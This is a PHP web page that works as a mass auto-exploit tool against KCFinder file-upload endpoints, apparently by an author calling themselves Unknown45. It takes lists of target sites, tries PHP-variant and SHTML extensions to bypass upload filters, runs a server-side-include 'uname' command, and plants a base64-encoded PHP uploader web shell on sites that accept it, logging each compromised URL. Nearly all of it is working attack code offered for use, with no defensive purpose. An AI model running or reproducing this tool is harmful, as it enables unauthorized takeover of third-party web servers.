<html>
<head>
<title>[+] Mass KCFinder Auto Upload Shell [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
</head>
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
<body bgcolor="#1e1e1e" text="white" style="max-width: 100%">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');


textarea {
max-width: 90%;
width: 90%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}

nemu {
  color: green;
}

kgk {
  color: red;
}

oren {
	color: orange;
}

kuning {
	color: yellow;
}
</style>
<body>
<center>
<font face=courier new size=5>Mass KCFinder Auto Upshell<br><font size="3">Auto Exploit Pada KCFinder Yang Vuln Upload</font><font size="3"><hr>
<form method="post">
<textarea rows=1 name="url" placeholder="https://exploits.my.id/kcfinder/upload.php" required="true"></textarea><br><br>
<input type="submit" name="go" value="Gaskan">
</form>
<?php
if (isset($_POST['go'])) {
	ob_implicit_flush();ob_end_flush();
	echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
	$web = $_POST['url'];
	if (empty($web)) {
		die();
	} elseif (!preg_match("/upload.php/i", $web)) {
		die("Masukkan Web Yang benar ! sites.com/kcfinder/upload.php \n");
	}
	$web = explode("\r\n", $web);
  if (count($web) > 20) {
    die("Maxsimal 20 Web per submit !");
  }
	echo "[+] Loading ... ( ".count($web)." sites )<br><br>";
	foreach ($web as $wb) {
		$c = check($wb);
		if (preg_match("/write to upload|have permissions/i", $c)) {
			preg_match_all('/alert(.*?);/im', $c, $d);
			$d = $d[1];$d = $d[0];
			echo "[<kgk>Error</kgk>] ".$wb." ".$d."<br>";
			continue;
		}
		$browse = str_replace("upload.php", "browse.php", $wb);
		$cek = check($browse);
		preg_match_all('/uploadURL = "(.*?)";/im', $cek, $res);
		$res = $res[1];
		$res = $res[0];
		if (empty($res)) {
			$path = str_replace("upload.php", "upload/files/", $wb);
		} elseif (preg_match("/http/i", $res)) {
			$path = $res."/files/";
			//echo $path;
		} else {
			$aw = parse_url($wb);
			$path = $aw['scheme']."://".$aw['host'].$res."/files/";
			//echo $path;
		}
		$exts = array("php5", "php7", "php56", "php3", "php2", "phar", "inc", "pht", "php.fla", "php74", "shtml", "phtml");
		foreach ($exts as $ext) {
			//echo "files[]=files/unknown45.".$ext."&";
			//continue;
			$ekse = upload($wb, "unknown45.".$ext);
			$lok = $path."unknown45.".$ext;
			if (preg_match("/enied file extension/i", $ekse)) {
				echo "[<kuning>Denied Ext</kuning>] ".$lok."<br>";
				continue;
			}
			$ceklagi = check($lok);
			if ($ext == "shtml") {
				if (preg_match("/Linux/i", $ceklagi)) {
					echo "[<nemu>Vuln</nemu>] ".$lok."<br>";
					file_put_contents("/tmp/tempku/kcfinder/kcfinder.txt", $lok."\n", FILE_APPEND);
					upload($wb, "uk45-ssi.shtml");
					$cok = check($path."uk45-ssi.shtml");
					if (preg_match("/hargai author dengan cara menggunakan/i", $cok)) {
						echo "[<nemu>Shell</nemu>] ".$path."uk45-ssi.shtml<br>";
					} else {
						echo "[<kuning>Failed Upshell</kuning>] ".$path."uk45-ssi.shtml<br>";
					}
				} else {
					echo "[<kgk>Not Vuln</kgk>] ".$lok."<br>";
				}
			} else {
				if (preg_match("/vulncoeg/i", $ceklagi)) {
					echo "[<nemu>Vuln</nemu>] ".$lok."<br>";
					file_put_contents("/tmp/tempku/kcfinder/kcfinder.txt", $lok."\n", FILE_APPEND);
					copy("/tmp/tempku/kcfinder/uk45-up.php", "/tmp/tempku/kcfinder/uk45-up.".$ext);
					upload($wb, "uk45-up.".$ext);
					$cok = check($path."uk45-up.".$ext);
					if (preg_match("/Unknown45 Uploader/i", $cok)) {
						echo "[<nemu>Shell</nemu>] ".$path."uk45-up.".$ext."<br>";
					} else {
						echo "[<kuning>Failed Upshell</kuning>] ".$path."uk45-up.".$ext."<br>";
						echo check($path."uk45-up.".$ext);
					}
				} else {
					echo "[<kgk>Not Vuln</kgk>] ".$lok."<br>";
				}
			}
		}
		post(str_replace("upload.php", "browse.php?type=files&lng=en&act=rm_cbd", $wb), "files[]=files/unknown45.php5&files[]=files/unknown45.php7&files[]=files/unknown45.php56&files[]=files/unknown45.php3&files[]=files/unknown45.php2&files[]=files/unknown45.phar&files[]=files/unknown45.inc&files[]=files/unknown45.pht&files[]=files/unknown45.php.fla&files[]=files/unknown45.php74&files[]=files/unknown45.shtml&files[]=files/unknown45.phtml");
	}
	echo "<br>[+] Done ...";
	echo "</pre>";
}

function check($web) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
	//curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko, ".rand().") Chrome/92.0.4515.131 Safari/537.36");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15); 
	curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	return curl_exec($ch);
	curl_close($ch);
}

function post($web, $post) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
	//curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTREDIR, 3);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko, ".rand().") Chrome/92.0.4515.131 Safari/537.36");
	//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); 
	curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	return curl_exec($ch);
	curl_close($ch);
}

function upload($web, $ext) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $web);
	//curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest"));
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTREDIR, 3);
	curl_setopt($ch, CURLOPT_POSTFIELDS, array("Filedata" => curl_file_create("/tmp/tempku/kcfinder/".$ext)) );
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko. ".rand().") Chrome/92.0.4515.131 Safari/537.36");
	//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); 
	curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	return curl_exec($ch);
	curl_close($ch);
}

if (!file_exists("/tmp/tempku")) {
	mkdir("/tmp/tempku");
}
if (!file_exists("/tmp/tempku/kcfinder")) {
	mkdir("/tmp/tempku/kcfinder");
}
if (!file_exists("/tmp/tempku/kcfinder/uk45-up.php") || filesize("/tmp/tempku/kcfinder/uk45-up.php") == "0") {
	$data = base64_decode("PD89YmFzZTY0X2RlY29kZSgiZG5Wc2JtTnZaV2M9Iik7Pz4=");
	$exts = array("php", "php2", "php3", "php5", "php56", "php7", "php74", "phar", "pht", "phtml", "php.fla");
	foreach ($exts as $ext) {
		file_put_contents("/tmp/tempku/kcfinder/unknown45.".$ext, $data);
	}
	file_put_contents("/tmp/tempku/kcfinder/unknown45.shtml", base64_decode("PCEtLSNleGVjIGNtZD0idW5hbWUiIC0tPg=="));
	file_put_contents("/tmp/tempku/kcfinder/uk45-up.php", base64_decode("PG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJub2luZGV4Ij4KVW5rbm93bjQ1IEdhbnRlbmcKPGZvcm0gbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KCTxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJnYW50ZW5nIj4KCTxidXR0b24+R2Fza2FuPC9idXR0b24+CjwvZm9ybT4KPD9waHAKaWYgKGlzc2V0KCRfRklMRVNbJ2dhbnRlbmcnXSkpIHsKCWlmIChyZW5hbWUoJF9GSUxFU1snZ2FudGVuZyddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydnYW50ZW5nJ11bJ25hbWUnXSkgIT09IGZhbHNlKSB7CgkJZWNobyAiW1N1Y2Nlc3NdIDxhIGhyZWY9JyIuJF9GSUxFU1snZ2FudGVuZyddWyduYW1lJ10uIic+Ii5yZWFscGF0aCgkX0ZJTEVTWydnYW50ZW5nJ11bJ25hbWUnXSkuIjwvYT4iOwoJfSBlbHNlIHsKCQllY2hvICJbRmFpbGVkIHRvIHVwbG9hZF0iOwoJfQp9Cj8+Cg=="));
}
?>
</font>
<center><hr><font size=3>Unknown45 - 2021
</body>
</html>